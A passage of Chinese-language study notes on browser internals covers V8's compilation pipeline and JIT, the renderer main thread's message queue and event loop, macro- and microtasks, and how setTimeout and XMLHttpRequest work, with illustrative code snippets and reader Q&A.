AST。如果源码符合语法规则，这一步就会顺利完成。但如果源码存在语法错误，这一步就会终止，并抛出一个“语法错误”。\n有了 AST 后，那接下来 V8 就会生成该段代码的执行上下文。\n2. 生成字节码\n接下解释器 Ignition 会根据 AST 生成字节码，并解释执行字节码。\n之前的 V8 并没有字节码，而是直接将 AST 转换为机器码，由于执行机器码的效率是非常高效的，所以这种方式在发布后的一段时间内运行效果是非常好的。但是随着 Chrome 在手机上的广泛普及，内存占用问题也暴露出来了，因为 V8 需要消耗大量的内存来存放转换后的机器码。为了解决内存占用问题，V8 团队大幅重构了引擎架构，引入字节码，并且抛弃了之前的编译器。\n什么是字节码？为什么引入字节码就能解决内存占用问题？\n字节码就是介于 AST 和机器码之间的一种代码。但是与特定类型的机器码无关，字节码需要通过解释器将其转换为机器码后才能执行。\n从图中可以看出，机器码所占用的空间远远超过了字节码，所以使用字节码可以减少系统的内存使用。\n3. 执行代码\n生成字节码之后，接下来就要执行阶段。\n解释器 Ignition 除了负责生成字节码之外，它还有另外一个作用，就是解释执行字节码。\n通常，如果有一段第一次执行的字节码，解释器 Ignition 会逐条解释执行。在执行字节码的过程中，如果发现有热点代码（HotSpot），比如一段代码被重复执行多次，这种就称为热点代码，那么后台的编译器 TurboFan 就会把该段热点的字节码编译为高效的机器码，然后当再次执行这段被优化的代码时，只需要执行编译后的机器码就可以了，这样就大大提升了代码的执行效率。\n解释器 Ignition 是点火器的意思，编译器 TurboFan 是涡轮增压的意思，寓意着代码启动时通过点火器慢慢发动，一旦启动，涡轮增压介入，其执行效率随着执行时间越来越高效率，因为热点代码都被编译器 TurboFan 转换了机器码，直接执行机器码就省去了字节码“翻译”为机器码的过程。\n字节码配合解释器和编译器，比如 Java 和 Python 的虚拟机也都是基于这种技术实现的，我们把这种技术称为即时编译（JIT）。具体到 V8，就是指解释器 Ignition 在解释执行字节码的同时，收集代码信息，当它发现某一部分代码变热了之后，TurboFan 编译器便把热点的字节码转换为机器码，并把转换后的机器码保存起来，以备下次使用。\n理解 JIT 工作机制,JIT 的工作过程:\nJavaScript 的性能优化 对于优化 JavaScript 执行效率，将优化的中心聚焦在单次脚本的执行时间和脚本的网络下载上，主要关注以下三点内容：\n提升单次脚本的执行速度，避免 JavaScript 的长任务霸占主线程，这样可以使得页面快速响应交互； 避免大的内联脚本，因为在解析 HTML 的过程中，解析和编译也会占用主线程； 减少 JavaScript 文件的容量，因为更小的文件会提升下载速度，并且占用更低的内存。 问题：你是怎么理解“V8 执行时间越久，执行效率越高”这个性质的？\n渲染进程里的 input 标签上传图片，通过与浏览器主进程通信，主进程读取硬盘图片数据返回给渲染进程，渲染进程里的 js 发起 ajax 请求，渲染进程中的的 xmlhttprequest 可以直接走网络进程，由网络进程发起请求，不需要浏览器进程介入。\n请求长时间处于 pending 状态或者脚本执行死循环，这时刷新或前进后退页面不响应，刷新或前进后退页面是属于浏览器主进程的 UI 交互行为，为什么渲染进程里的 js 引擎执行会影响到主进程？\n因为前进或者后退也需要执行当前页面脚本，比如要执行 beforeunload 事件，执行的时候页面没响应了，所以前进后退也就失效了\n1 2 3 4 5 6 7 8 9 10 11 function fn() { var a = 10; function f1() { console.log(a); } function f2() { console.log(\u0026#34;f2\u0026#34;); } f2(); } fn(); 我在函数 f2 里打断点，当执行到函数 f2 时，chrome 里显示 Closure:{a:10},如果把这个原因解释为在 fn 函数里会预扫描 f1 函数，那我现在把 fn2 函数和调用都注释了，现在执行 fn 函数时不产生 Closure，为什么就不预扫描 f1 函数了？这是为什么？\n把 f2 注释了，当执行 fn 函数时，照样会预扫描 f1，照样会产生闭包，只不过当 fn 执行结束之后，闭包的内容没有外部引用，那么下次垃圾回收直接把比闭包的内容回收掉\n问题：编译的基本单位是一段 JS 代码（内敛 JS）或者一个 JS 文件吗(还是以当前调用栈将要执行函数为单位）？\n作者回复: 全局代码，或者函数 ！\n比如下载完一个 js 文件，先编译这个 js 文件,但是 js 文件内定义的函数是不会编译的。\n等调用到该函数的时候，Javascript 引擎才会去编译该函数！\n消息队列和事件循环 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // 基本的概念 进程和线程之间的关系 // 计算机分配任务是以进程来分配的 ， 进程中包含着线程 // 浏览器是一个进程 而且是一个多进程模型 （多进程的好处就是其中一个进程挂掉了，不会影响其他进程） // 一个tab就是一个独立的进程 // 浏览器默认要有一个主进程，来调度其他进程 （进程间的通信） // 网络进程 发送http请求等 // 插件也有独立的进程 // gpu绘图进程 // 一个tab就是一个独立的进程 (渲染进程) // 渲染进程 (线程) // ui 渲染线程 负责页面渲染，布局，绘制 // js 引擎线程 执行js代码的 // 互斥的：js可以操作dom ，渲染需要dom 如果正在渲染页面时，渲染到一半了如果js要求把dom删除掉？ // js也是单线程的， 由于如果js是多线程操作dom的会导致 一个线程说我要添加一个节点， 另一个说我要删除节点？ // js也是单线程的 指代的是主线程 （默认代码从上到下依次执行） // 定时器， 发请求， 用户事件 （在主线程执行的时候 还会创建一些独立的线程） // 异步 ： 为异步任务划分优先级 // 宏任务和微任务执行时机不一样 // 宏任务 macro-task： 写的script脚本， ui渲染，定时器(setTimeout)， 发请求， 用户事件，messageChannel, setImmediate(ie下有，比setTimeout性能好) // 微任务 micro-task： Promise.then(语言本身提供的)， queueMicrotashk MutationObserver （异步监控dom的变化） // requestFrameAnimation requestAdleCallback (发生在渲染里的， 就是个回调函数， 这个东西不应该分到宏任务和微任务中) // js 执行的顺序怎么定义呢？ 先执行完当前同步代码，再去执行异步代码。 有一个单独的线程来扫描异步任务 事件触发线程EventLoop // 代码执行的过程的时候 会产生微任务和宏任务 // 当发生的宏任务时间到达的时候会被发入到宏任务队列中 (放入是回调) 宏任务只有一个队列 // 微任务是立刻放到队列中 （每次执行宏任务的时候会产生一个微任务队列） // 当前宏任务执行完毕后，会清空本轮产生的微任务, 如果执行微任务的时候又产生了微任务，会放到当前微任务的尾部 // 看一眼要不要渲染页面？ 要渲染就渲染（requestFrameAnimation requestAdleCallback） 刷新频率 16.6ms // 再去扫描宏任务队列，如果有则取出第一个宏任务 ， 再去执行 // 每次微任务是执行一批 ， 宏任务是执行一个 每个渲染进程都有一个主线程（基本是每个 Tab 页面都有自己的渲染进程，该进程中有一个主线程），主线程中会执行多种不同的任务，且同一时刻只能处理一项任务：\n处理 DOM 解析 计算样式 处理布局 处理 JavaScript 任务 各种输入事件 要让这么多不同类型的任务在主线程中有序地执行，这就需要一个系统来统筹调度这些任务，这个统筹调度系统就是消息队列和事件循环系统。\n页面的事件循环系统 它能让你理解页面到底是如何运行的。理解浏览器渲染进程中的主线程是如何工作的。\n使用单线程处理安排好的任务 比如有如下一系列的任务：\n任务 1：1+2 任务 2：20/5 任务 3：7*8 任务 4：打印出任务 1、任务 2、任务 3 的运算结果 现在在一个线程中去执行这些任务，通常会这样编写代码：\n1 2 3 4 5 6 void MainThread(){ int num1 = 1+2; // 任务 1 int num2 = 20/5; // 任务 2 int num3 = 7*8; // 任务 3 print(\u0026#34; 最终计算的值为:%d,%d,%d\u0026#34;,num,num2,num3)； // 任务 4 } 在上面的执行代码中，把所有任务代码按照顺序写进主线程里，等线程执行时，这些任务会按照顺序在线程中依次被执行；等所有任务执行完成之后，线程会自动退出。\n在线程运行过程中处理新任务 并不是所有的任务都是在执行之前统一安排好的，大部分情况下，新的任务是在线程运行过程中产生的。\n要想在线程运行过程中，能接收并执行新的任务，就需要采用事件循环机制。通过一个 for 循环语句来监听是否有新的任务，如下面的示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //GetInput // 等待用户从键盘输入一个数字，并返回该输入的数字 int GetInput(){ int input_number = 0; cout\u0026lt;\u0026lt;\u0026#34; 请输入一个数:\u0026#34;; cin\u0026gt;\u0026gt;input_number; return input_number; } // 主线程 (Main Thread) void MainThread(){ for(;;){ int first_num = GetInput()； int second_num = GetInput()； result_num = first_num + second_num; print(\u0026#34; 最终计算的值为:%d\u0026#34;,result_num)； } } 这一版的线程做了两点改进：\n引入事件循环机制，在线程语句最后添加了一个for 循环语句，线程会一直循环执行。 引入事件，可以在线程运行过程中，等待用户输入的数字，等待过程中线程处于暂停状态，一旦接收到用户输入的信息，那么线程会被激活，然后执行相加运算，最后输出结果。 处理其他线程发送过来的任务 在第二版的线程模型中，所有的任务都是来自于线程内部的，如果另外一个线程想让主线程执行一个任务，利用第二版的线程模型是无法做到的。\n其他线程是如何发送消息给渲染主线程的，具体形式可以参考下图：\n渲染主线程会频繁接收到来自于 IO 线程的一些任务，接收到这些任务之后，渲染进程主线程就需要着手处理，比如接收到资源加载完成的消息后，渲染进程的主线程就要着手进行 DOM 解析了；接收到鼠标点击的消息后，渲染主线程就要开始执行相应的 JavaScript 脚本来处理该点击事件。\n那么如何设计好一个线程模型，让其能够接收其他线程发送的消息呢？\n一个通用模式是使用消息队列。\n第三版的线程模型\n构造一个消息队列（下面是接口，不是实现）\n1 2 3 4 5 class TaskQueue{ public: Task takeTask(); // 取出队列头部的一个任务 void pushTask(Task task); // 添加一个任务到队列尾部 }; 改造主线程，让主线程从队列中读取任务\n1 2 3 4 5 6 7 8 TaskQueue task_queue； void ProcessTask(); void MainThread(){ for(;;){ Task task = task_queue.takeTask(); ProcessTask(task); } } 在上面的代码中，添加了一个消息队列的对象，然后在主线程的 for 循环代码块中，从消息队列中读取一个任务，然后执行该任务，主线程就这样一直循环往下执行，因此只要消息队列中有任务，主线程就会去执行。\n主线程执行的任务都全部从消息队列中获取。所以如果有其他线程想要发送任务让主线程去执行，只需要将任务添加到该消息队列中就可以了，添加任务的代码如下：\n1 2 Task clickTask; task_queue.pushTask(clickTask) 由于是多个线程操作同一个消息队列，所以在添加任务和取出任务时还会加上一个同步锁。\n处理其他进程发送过来的任务\n通过使用消息队列，我们实现了线程之间的消息通信。在 Chrome 中，跨进程之间的任务也是频繁发生的，那么如何处理其他进程发送过来的任务？\n从图中可以看出，渲染进程专门有一个 IO 线程用来接收其他进程传进来的消息，接收到消息之后，会将这些消息组装成任务添加到消息队列中，后续的步骤就和前面讲解的“处理其他线程发送的任务”一样。\n消息队列中的任务类型 消息队列中的任务类型可以参考下Chromium 的官方源码，这里面包含了很多内部消息类型，如输入事件（鼠标滚动、点击、移动）、微任务、文件读写、WebSocket、JavaScript 定时器等等。\n除此之外，消息队列中还包含了很多与页面相关的事件，如 JavaScript 执行、解析 DOM、样式计算、布局计算、CSS 动画（不是全部的 css 动画都需要占用主线程）等。\n以上这些事件都是在主线程中执行的，所以在编写 Web 应用时，你还需要衡量这些事件所占用的时长，并想办法解决单个任务占用主线程过久的问题。\n安全退出 当页面主线程执行完成之后，又该如何保证页面主线程能够安全退出呢？Chrome 是这样解决的，确定要退出当前页面时，页面主线程会设置一个退出标志的变量，在每次执行完一个任务时，判断是否有设置退出标志。\n如果设置了，那么就直接中断当前的所有任务，退出线程，你可以参考下面代码：\n1 2 3 4 5 6 7 8 9 10 11 TaskQueue task_queue； void ProcessTask(); bool keep_running = true; void MainThread(){ for(;;){ Task task = task_queue.takeTask(); ProcessTask(task); if(!keep_running) // 如果设置了退出标志，那么直接退出线程循环 break; } } 页面使用单线程的缺点 页面线程所有执行的任务都来自于消息队列。消息队列是“先进先出”的属性，也就是说放入队列中的任务，需要等待前面的任务被执行完，才会被执行。鉴于这个属性，就有如下两个问题需要解决。\n第一个问题是如何处理高优先级的任务。\n比如一个典型的场景是监控 DOM 节点的变化情况（节点的插入、修改、删除等动态变化），然后根据这些变化来处理相应的业务逻辑。一个通用的设计的是，利用 JavaScript 设计一套监听接口，当变化发生时，渲染引擎同步调用这些接口，这是一个典型的观察者模式。\n不过这个模式有个问题，因为 DOM 变化非常频繁，如果每次发生变化的时候，都直接调用相应的 JavaScript 接口，那么这个当前的任务执行时间会被拉长，从而导致执行效率的下降。\n如果将这些 DOM 变化做成异步的消息事件，添加到消息队列的尾部，那么又会影响到监控的实时性，因为在添加到消息队列的过程中，可能前面就有很多任务在排队了。\n这也就是说，如果 DOM 发生变化，采用同步通知的方式，会影响当前任务的执行效率；如果采用异步方式，又会影响到监控的实时性。\n那该如何权衡效率和实时性呢？\n针对这种情况，微任务就应用而生了，微任务是如何权衡效率和实时性的。\n通常我们把消息队列中的一个个的任务称为宏任务，每个宏任务中都包含了一个微任务队列，在执行宏任务的过程中，如果 DOM 有变化，那么就会将该变化添加到微任务列表中，这样就不会影响到宏任务的继续执行，因此也就解决了执行效率的问题。\n等宏任务中的主要功能都执行完成之后，这时候，渲染引擎并不着急去执行下一个宏任务，而是执行当前宏任务中的微任务，因为 DOM 变化的事件都保存在这些微任务队列中，这样也就解决了实时性问题。\n第二个是如何解决单个任务执行时长过久的问题。\n因为所有的任务都是在单线程中执行的，所以每次只能执行一个任务，而其他任务就都处于等待状态。如果其中一个任务执行时间过久，那么下一个任务就要等待很长时间。可以参考下图：\n从图中你可以看到，如果在执行动画过程中，其中有个 JavaScript 任务因执行时间过久，占用了动画单帧的时间，这样会给用户制造了卡顿的感觉，这当然是极不好的用户体验。针对这种情况，JavaScript 可以通过回调功能来规避这种问题，也就是让要执行的 JavaScript 任务滞后执行。\n实践：浏览器页面是如何运行的 打开开发者工具，点击“Performance”标签，选择左上角的“start porfiling and load page”来记录整个页面加载过程中的事件执行情况，如下图所示：\n从图中可以看出，我们点击展开了 Main 这个项目，其记录了主线程执行过程中的所有任务。图中灰色的就是一个个任务，每个任务下面还有子任务，其中的 Parse HTML 任务，是把 HTML 解析为 DOM 的任务。值得注意的是，在执行 Parse HTML 的时候，如果遇到 JavaScript 脚本，那么会暂停当前的 HTML 解析而去执行 JavaScript 脚本。\n问题：结合消息队列和事件循环，你认为微任务是什么？引入微任务能带来什么优势呢？\n每个宏任务都有一个微任务列表，在宏任务的执行过程中产生微任务会被添加到改列表中，等宏任务快执行结束之后，会执行微认为列表，所以微任务依然运行在当前宏任务的执行环境中，这个特性会导致宏任务和微任务有一些本质上的区别！\n宿主发起的任务是宏任务 如点击事件，settimeout 进消息队列；js 引擎发起的任务是微任务如 promise。\n宏任务是开会分配的工作内容，微任务是工作过程中被临时安排的内容。\n问：用 CSS3 实现动画是不是不会影响主线程，和用 JS 实现动画会影响主线程？\n答：部分 css3 的动画效果是在合成线程上实现的，不需要主线程介入，所以省去了重拍和重绘的过程，这就大大提升了渲染效率。 JavaScript 都是在在主线程上执行的，所以 JavaScript 的动画需要主线程的参与，所以效率会大打折扣！\n问：为什么说页面是单线程架构？ 默认情况下每个标签页都会配套一个渲染进程，而一个渲染进程里不是有主线程、合成线程、IO 线程等多个线程吗？ 是因为【排版引擎 blink】 和【JavaScript 引擎 v8】都工作在渲染进程的主线程上并且是互斥的，基于这点说页面是单线程架构？\n答：是的，他们都是在渲染进程的主线程上工作，所以同时只能执行一个。 比如 v8 除了在主线程上执行 JavaScript 代码之外，还会在主线程上执行垃圾回收，所以执行垃圾回收时停止主线程上的所有任务，我们把垃圾回收这个特性叫着全停顿。 因为 JavaScript 引擎是运行在渲染进程的主线程上的，所以我们说 JavaScript 是单线程执行的！\n事件循环的本质是 for 循环，循环不会一直迭代导致主线程卡主吗？\n不会，实际过程中采用系统级中断机制，也就是有事件时，线程才会被激活，没事件时，线程就会被挂起。\n每一个宏任务都有一个微任务队列？还是整个任务队列有一个微任务队列？\n每个宏任务都有微任务队列。\nWebAPI 通过setTimeout和XMLHttpRequest这两个 WebAPI 来介绍事件循环的应用 。\nsetTimeout\n是一个定时器，用来指定某个函数在多少毫秒之后执行。它会返回一个整数，表示定时器的编号，同时你还可以通过该编号来取消这个定时器。\n1 2 3 4 function showName() { console.log(\u0026#34; 极客时间 \u0026#34;); } var timerID = setTimeout(showName, 200); 浏览器是如何实现定时器 渲染进程中所有运行在主线程上的任务都需要先添加到消息队列，然后事件循环系统再按照顺序执行消息队列中的任务。那些典型的事件：\n当接收到 HTML 文档数据，渲染引擎就会将“解析 DOM”事件添加到消息队列中， 当用户改变了 Web 页面的窗口大小，渲染引擎就会将“重新布局”的事件添加到消息队列中。 当触发了 JavaScript 引擎垃圾回收机制，渲染引擎会将“垃圾回收”任务添加到消息队列中。 要执行一段异步 JavaScript 代码，也是需要将执行任务添加到消息队列中。 这些事件被添加到消息队列之后，事件循环系统就会按照消息队列中的顺序来执行事件。\n要执行一段异步任务，需要先将任务添加到消息队列中。不过通过定时器设置回调函数有点特别，它们需要在指定的时间间隔内被调用，但消息队列中的任务是按照顺序执行的，所以为了保证回调函数能在指定时间内执行，你不能将定时器的回调函数直接添加到消息队列中。\n在 Chrome 中除了正常使用的消息队列之外，还有另外一个消息队列，这个队列中维护了需要延迟执行的任务列表，包括了定时器和 Chromium 内部一些需要延迟执行的任务。所以当通过 JavaScript 创建一个定时器时，会将定时器交给定时器线程进行时间的计算和管理，一旦时间达到条件，该线程会将会将该定时器的回调任务添加到延迟队列中。\n参考Chromium 中关于队列部分的源码。\n源码中延迟执行队列的定义如下所示：\n1 DelayedIncomingQueue delayed_incoming_queue; 当通过 JavaScript 调用 setTimeout 设置回调函数的时候，渲染进程将会创建一个回调任务，包含了回调函数 showName、当前发起时间、延迟执行时间，其模拟代码如下所示：\n1 2 3 4 5 6 7 8 9 10 struct DelayTask{ int64 id； CallBackFunction cbf; int start_time; int delay_time; }; DelayTask timerTask; timerTask.cbf = showName; timerTask.start_time = getCurrentTime(); // 获取当前时间 timerTask.delay_time = 200;// 设置延迟执行时间 创建好回调任务之后，再将该任务添加到延迟执行队列中，代码如下所示：\n1 delayed_incoming_queue.push(timerTask)； 现在通过定时器发起的任务就被保存到延迟队列中了，那消息循环系统是怎么触发延迟队列的。\n可以来完善之前的消息循环的代码，在其中加入执行延迟队列的代码，如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 void ProcessTimerTask(){ // 从 delayed_incoming_queue 中取出已经到期的定时器任务 // 依次执行这些任务 } TaskQueue task_queue； void ProcessTask(); bool keep_running = true; void MainTherad(){ for(;;){ // 执行消息队列中的任务 Task task = task_queue.takeTask(); ProcessTask(task); // 执行延迟队列中的任务 ProcessDelayTask() if(!keep_running) // 如果设置了退出标志，那么直接退出线程循环 break; } } 从上面代码可以看出来，添加了一个ProcessDelayTask 函数，该函数是专门用来处理延迟执行任务的。重点关注它的执行时机，在上段代码中，处理完消息队列中的一个任务之后，就开始执行 ProcessDelayTask 函数。ProcessDelayTask 函数会根据发起时间和延迟时间计算出到期的任务，然后依次执行这些到期的任务。等到期的任务执行完成之后，再继续下一个循环过程。通过这样的方式，一个完整的定时器就实现了。\n设置一个定时器，JavaScript 引擎会返回一个定时器的 ID。那通常情况下，当一个定时器的任务还没有被执行的时候，也是可以取消的，具体方法是调用clearTimeout 函数，并传入需要取消的定时器的 ID。如下面代码所示：\n1 clearTimeout(timer_id); 其实浏览器内部实现取消定时器的操作也是非常简单的，就是直接从 delayed_incoming_queue 延迟队列中，通过 ID 查找到对应的任务，然后再将其从队列中删除掉就可以了。\n使用 setTimeout 的一些注意事项 1. 如果当前任务执行时间过久，会影延迟到期定时器任务的执行\n在使用 setTimeout 的时候，有很多因素会导致回调函数执行比设定的预期值要久，其中一个就是当前任务执行时间过久从而导致定时器设置的任务被延后执行。\n1 2 3 4 5 6 7 8 9 10 11 function bar() { console.log(\u0026#34;bar\u0026#34;); } function foo() { setTimeout(bar, 0); for (let i = 0; i \u0026lt; 5000; i++) { let i = 5 + 8 + 8 + 8; console.log(i); } } foo(); 这段代码中，在执行 foo 函数的时候使用 setTimeout 设置了一个 0 延时的回调任务，设置好回调任务后，foo 函数会继续执行 5000 次 for 循环。\n通过 setTimeout 设置的回调任务被放入了消息队列中并且等待下一次执行，这里并不是立即执行的；要执行消息队列中的下个任务，需要等待当前的任务执行完成，由于当前这段代码要执行 5000 次的 for 循环，所以当前这个任务的执行时间会比较久一点。这势必会影响到下个任务的执行时间。\n打开 Performance 来看看其执行过程，如下图所示：\n从图中可以看到，执行 foo 函数所消耗的时长是 500 毫秒，这也就意味着通过 setTimeout 设置的任务会被推迟到 500 毫秒以后再去执行，而设置 setTimeout 的回调延迟时间是 0。\n2. 如果 setTimeout 存在嵌套调用，那么系统会设置最短时间间隔为 4 毫秒\n1 2 3 4 function cb() { setTimeout(cb, 0); } setTimeout(cb, 0); 可以通过 Performance 来记录下这段代码的执行过程，如下图所示：\n上图中的竖线就是定时器的函数回调过程，从图中可以看出，前面五次调用的时间间隔比较小，嵌套调用超过五次以上，后面每次的调用最小时间间隔是 4 毫秒。之所以出现这样的情况，是因为在 Chrome 中，定时器被嵌套调用 5 次以上，系统会判断该函数方法被阻塞了，如果定时器的调用时间间隔小于 4 毫秒，那么浏览器会将每次调用的时间间隔设置为 4 毫秒。下面是Chromium 实现 4 毫秒延迟的代码：\n1 2 3 4 5 6 7 8 static const int kMaxTimerNestingLevel = 5; // Chromium uses a minimum timer interval of 4ms. We\u0026#39;d like to go // lower; however, there are poorly coded websites out there which do // create CPU-spinning loops. Using 4ms prevents the CPU from // spinning too busily and provides a balance between CPU spinning and // the smallest possible interval timer. static constexpr base::TimeDelta kMinimumInterval = base::TimeDelta::FromMilliseconds(4); 1 2 3 4 5 6 7 8 9 10 11 base::TimeDelta interval_milliseconds = std::max(base::TimeDelta::FromMilliseconds(1), interval); if (interval_milliseconds \u0026lt; kMinimumInterval \u0026amp;\u0026amp; nesting_level_ \u0026gt;= kMaxTimerNestingLevel) interval_milliseconds = kMinimumInterval; if (single_shot) StartOneShot(interval_milliseconds, FROM_HERE); else StartRepeating(interval_milliseconds, FROM_HERE); 所以，一些实时性较高的需求就不太适合使用 setTimeout 了，比如用 setTimeout 来实现 JavaScript 动画就不是一个很好的主意。\n3. 未激活的页面，setTimeout 执行最小间隔是 1000 毫秒\n如果标签不是当前的激活标签，那么定时器最小的时间间隔是 1000 毫秒，目的是为了优化后台页面的加载损耗以及降低耗电量。\n4. 延时执行时间有最大值\n除了要了解定时器的回调函数时间比实际设定值要延后之外，还有一点需要注意下，那就是 Chrome、Safari、Firefox 都是以 32 个 bit 来存储延时值的，32bit 最大只能存放的数字是 2147483647 毫秒，这就意味着，如果 setTimeout 设置的延迟值大于 2147483647 毫秒（大约 24.8 天）时就会溢出，那么相当于延时值被设置为 0 了，这导致定时器会被立即执行：\n1 2 3 4 function showName(){ console.log(\u0026#34; 极客时间 \u0026#34;) } var timerID = setTimeout(showName,2147483648);// 会被理解调用执行 运行后可以看到，这段代码是立即被执行的。但如果将延时值修改为小于 2147483647 毫秒的某个值，那么执行时就没有问题了。\n5. 使用 setTimeout 设置的回调函数中的 this 不符合直觉\n如果被 setTimeout 推迟执行的回调函数是某个对象的方法，那么该方法中的 this 关键字将指向全局环境，而不是定义时所在的那个对象：\n1 2 3 4 5 6 7 8 var name = 1; var MyObj = { name: 2, showName: function () { console.log(this.name); }, }; setTimeout(MyObj.showName, 1000); 这里输出的是 1，因为这段代码在编译的时候，执行上下文中的 this 会被设置为全局 window，如果是严格模式，会被设置为 undefined。\n通常可以使用下面这两种方法解决这个问题：\n第一种是将MyObj.showName放在匿名函数中执行，如下所示：\n1 2 3 4 5 6 7 8 // 箭头函数 setTimeout(() =\u0026gt; { MyObj.showName(); }, 1000); // 或者 function 函数 setTimeout(function () { MyObj.showName(); }, 1000); 第二种是使用 bind 方法，将 showName 绑定在 MyObj 上面，代码如下所示：\n1 setTimeout(MyObj.showName.bind(MyObj), 1000); 对于一些时间精度要求比较高的需求，应该有针对性地采取一些其他的方案。\n由于使用 setTimeout 设置的回调任务实时性并不是太好，所以很多场景并不适合使用 setTimeout。比如你要使用 JavaScript 来实现动画效果，函数 requestAnimationFrame 就是个很好的选择。\n问题：你需要网上搜索了解下 requestAnimationFrame 的工作机制，并对比 setTimeout，然后分析出 requestAnimationFrame 实现的动画效果比 setTimeout 好的原因。\nrequestAnimationFrame 是一个原生的 API 去执行动画的效果，它会在一帧（一般是 16ms）间隔内根据选择浏览器情况去执行相关动作。 setTimeout 是在特定的时间间隔去执行任务，不到时间间隔不会去执行，这样浏览器就没有办法去自动优化。\n使用 requestAnimationFrame 不需要设置具体的时间，由系统来决定回调函数的执行时间，requestAnimationFrame 里面的回调函数是在页面刷新之前执行，它跟着屏幕的刷新频率走，保证每个刷新间隔只执行一次，内如果页面未激活的话，requestAnimationFrame 也会停止渲染，这样既可以保证页面的流畅性，又能节省主线程执行函数的开销。\n问题：我没有太理解这个异步延迟队列，既然是队列，但好像完全不符合先进先出的特点。在每次执行完任务队列中的一个任务之后都会去执行那些已经到期的延迟任务，这些延迟的任务具体是如何取出的呢。\n作者回复: 我文章说是队列，为了和消息队列统一起来，不然表述起来有点拗口。\n其实是一个 hashmap 结构，等到执行这个结构的时候，会计算 hashmap 中的每个任务是否到期了，到期了就去执行，直到所有到期的任务都执行结束，才会进入下一轮循环！\n关于任务优先级。whatwg 标准里，“An event loop has one or more task queues”。消息队列其实不算是队列，因为有很多个 task queue。“a task queue is a set of tasks”。每一个 task queue 才是一个队列。而对于每一个 task queue 里的 task，其 task source 是一致的，或者说不同的 task source 会被推入到不同的 task queue。就是规范里说的“every task source must be associated with a specific task queue”。而 task sources 都有哪些呢？比如 DOM 操作，UI 事件，网络事件等。这个 setTimout 应该也算是一种 task source 吧？会放到专门的队列里。上一轮事件循环结束后，会先选择一个高优先级的 task queue，然后取出 task queue 的第一个 task，也因此而有了事件的优先级，老师将的延时队列我有点不太知道怎么融入我现有的知识体系。 “重新布局”是 task 吗？ 老师说“重新布局”的事件会被放到消息队列。我的理解是 task -\u0026gt; microtask -\u0026gt; update the rendering。当然不是每次循环都走渲染过程，因为每次循环都特别快不可能每次都走一次渲染，浏览器会遵循 17ms 一桢的原则走一次 update the rendering，其中 rAF 也在此阶段执行，也是老师题目里 rAF 更流畅的原因。而重新布局也是在 update the rendering 阶段执行的，resize 和 onscroll 都是在 update the rendering 阶段。标准里在 update the rendering 阶段，会有“run the resize steps”，“run the scroll steps”，这也是为啥 scrolling 自带节流效果最多 17ms 触发一次回调的原因，所以我认为连续事件（resize，scroll）既然都不是 task -\u0026gt; microtask -\u0026gt; update the rendering 里的 task，而是 update the rendering 阶段，应该不会推送到某一个 task queue 才对。 第一个问题在 18 节也回答过了，一个是标准，一个是实现，标准定义了很多队列，而浏览器只实现了一个普通队列和一个延时队列！\n第二个问题，你说的那个 update the randering 就是说 rAF 吧？rAF 是用户调用的，重新布局是渲染引擎自动安排的任务，必然要放到消息队列中！\n滚动一般默认都是在合成线程里面完成的，这种都没用到主线程\nXMLHttpRequest 同步回调和异步回调\n什么是回调函数？将一个函数作为参数传递给另外一个函数，那作为参数的这个函数就是回调函数。\n1 2 3 4 5 6 7 8 9 let callback = function () { console.log(\u0026#34;i am do homework\u0026#34;); }; function doWork(cb) { console.log(\u0026#34;start do work\u0026#34;); cb(); console.log(\u0026#34;end do work\u0026#34;); } doWork(callback); 在上面示例代码中，将一个匿名函数赋值给变量 callback，同时将 callback 作为参数传递给了 doWork() 函数，这时在函数 doWork() 中 callback 就是回调函数。\n上面的回调方法有个特点，就是回调函数 callback 是在主函数 doWork 返回之前执行的，把这个回调过程称为同步回调。\n1 2 3 4 5 6 7 8 9 let callback = function () { console.log(\u0026#34;i am do homework\u0026#34;); }; function doWork(cb) { console.log(\u0026#34;start do work\u0026#34;); setTimeout(cb, 1000); console.log(\u0026#34;end do work\u0026#34;); } doWork(callback); 在这个例子中，使用了 setTimeout 函数让 callback 在 doWork 函数执行结束后，又延时了 1 秒再执行，这次 callback 并没有在主函数 doWork 内部被调用，把这种回调函数在主函数外部执行的过程称为异步回调。\n从事件循环的角度，看看同步回调和异步回调的区别。\n当循环系统在执行一个任务的时候，都要为这个任务维护一个系统调用栈。这个系统调用栈类似于 JavaScript 的调用栈，只不过系统调用栈是 Chromium 的开发语言 C++ 来维护的，其完整的调用栈信息你可以通过 chrome://tracing/ 来抓取。当然，你也可以通过 Performance 来抓取它核心的调用信息，如下图所示：\n这幅图记录了一个 Parse HTML 的任务执行过程，其中黄色的条目表示执行 JavaScript 的过程，其他颜色的条目表示浏览器内部系统的执行过程。\n通过该图可以看出来，Parse HTML 任务在执行过程中会遇到一系列的子过程，比如在解析页面的过程中遇到了 JavaScript 脚本，那么就暂停解析过程去执行该脚本，等执行完成之后，再恢复解析过程。然后又遇到了样式表，这时候又开始解析样式表……直到整个任务执行完成。\n需要说明的是，整个 Parse HTML 是一个完整的任务，在执行过程中的脚本解析、样式表解析都是该任务的子过程，其下拉的长条就是执行过程中调用栈的信息。\n每个任务在执行过程中都有自己的调用栈，那么同步回调就是在当前主函数的上下文中执行回调函数。异步回调是指回调函数在主函数之外执行，一般有两种方式：\n第一种是把异步函数做成一个任务，添加到信息队列尾部； 第二种是把异步函数添加到微任务队列中，这样就可以在当前任务的末尾处执行微任务了 XMLHttpRequest 运作机制 从发起请求到接收数据的完整流程。\nXMLHttpRequest 的用法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 function GetWebData(URL) { /** * 1: 新建 XMLHttpRequest 请求对象 */ let xhr = new XMLHttpRequest(); /** * 2: 注册相关事件回调处理函数 */ xhr.onreadystatechange = function () { switch (xhr.readyState) { case 0: // 请求未初始化 console.log(\u0026#34; 请求未初始化 \u0026#34;); break; case 1: //OPENED console.log(\u0026#34;OPENED\u0026#34;); break; case 2: //HEADERS_RECEIVED console.log(\u0026#34;HEADERS_RECEIVED\u0026#34;); break; case 3: //LOADING console.log(\u0026#34;LOADING\u0026#34;); break; case 4: //DONE if (this.status 